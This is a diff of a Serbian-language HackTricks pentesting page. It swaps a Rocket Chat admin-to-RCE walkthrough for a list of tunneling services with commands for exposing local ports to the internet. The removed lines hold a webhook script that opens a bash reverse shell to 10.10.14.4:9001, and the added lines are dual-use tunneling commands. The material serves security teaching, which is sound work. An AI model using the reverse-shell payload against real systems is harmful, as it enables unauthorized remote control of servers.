@@ -1,4 +1,4 @@
-# Rocket Chat
+# Izloži lokalno internetu
 
 {% hint style="success" %}
 Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -15,44 +15,75 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 </details>
 {% endhint %}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+**Cilj ove stranice je da predloži alternative koje omogućavaju DA BAR izlože lokalne sirove TCP portove i lokalne web stranice (HTTP) internetu BEZ potrebe da se bilo šta instalira na drugom serveru (samo lokalno ako je potrebno).**
 
-{% embed url="https://websec.nl/" %}
+## **Serveo**
 
-## RCE
+Sa [https://serveo.net/](https://serveo.net/), omogućava nekoliko http i port forwarding funkcija **besplatno**.
+```bash
+# Get a random port from serveo.net to expose local port 4444
+ssh -R 0:localhost:4444 serveo.net
 
-Ako ste admin unutar Rocket Chat-a, možete dobiti RCE.
-
-* Idite na **`Integrations`** i izaberite **`New Integration`** i odaberite bilo koju: **`Incoming WebHook`** ili **`Outgoing WebHook`**.
-* `/admin/integrations/incoming`
-
-<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>
-
-* Prema [dokumentaciji](https://docs.rocket.chat/guides/administration/admin-panel/integrations), oba koriste ES2015 / ECMAScript 6 ([u suštini JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) za obradu podataka. Tako da uzmimo [rev shell za javascript](../../generic-hacking/reverse-shells/linux.md#nodejs) kao:
-```javascript
-const require = console.log.constructor('return process.mainModule.require')();
-const { exec } = require('child_process');
-exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
+# Expose a web listening in localhost:300 in a random https URL
+ssh -R 80:localhost:3000 serveo.net
 ```
-* Konfigurišite WebHook (kanal i post kao korisničko ime moraju postojati):
+## SocketXP
 
-<figure><img src="../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>
+Sa [https://www.socketxp.com/download](https://www.socketxp.com/download), omogućava izlaganje tcp i http:
+```bash
+# Expose tcp port 22
+socketxp connect tcp://localhost:22
 
-* Konfigurišite WebHook skriptu:
+# Expose http port 8080
+socketxp connect http://localhost:8080
+```
+## Ngrok
 
-<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>
+Sa [https://ngrok.com/](https://ngrok.com/), omogućava izlaganje http i tcp portova:
+```bash
+# Expose web in 3000
+ngrok http 8000
 
-* Sačuvajte promene
-* Dobijte generisani WebHook URL:
+# Expose port in 9000 (it requires a credit card, but you won't be charged)
+ngrok tcp 9000
+```
+## Telebit
 
-<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
+Sa [https://telebit.cloud/](https://telebit.cloud/) omogućava izlaganje http i tcp portova:
+```bash
+# Expose web in 3000
+/Users/username/Applications/telebit/bin/telebit http 3000
 
-* Pozovite ga sa curl i trebali biste primiti rev shell
+# Expose port in 9000
+/Users/username/Applications/telebit/bin/telebit tcp 9000
+```
+## LocalXpose
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+Sa [https://localxpose.io/](https://localxpose.io/), omogućava nekoliko http i port forwarding funkcija **besplatno**.
+```bash
+# Expose web in port 8989
+loclx tunnel http -t 8989
 
-{% embed url="https://websec.nl/" %}
+# Expose tcp port in 4545 (requires pro)
+loclx tunnel tcp --port 4545
+```
+## Expose
 
+Sa [https://expose.dev/](https://expose.dev/) omogućava izlaganje http i tcp portova:
+```bash
+# Expose web in 3000
+./expose share http://localhost:3000
+
+# Expose tcp port in port 4444 (REQUIRES PREMIUM)
+./expose share-port 4444
+```
+## Localtunnel
+
+Sa [https://github.com/localtunnel/localtunnel](https://github.com/localtunnel/localtunnel) omogućava izlaganje http-a besplatno:
+```bash
+# Expose web in port 8000
+npx localtunnel --port 8000
+```
 {% hint style="success" %}
 Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
 Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
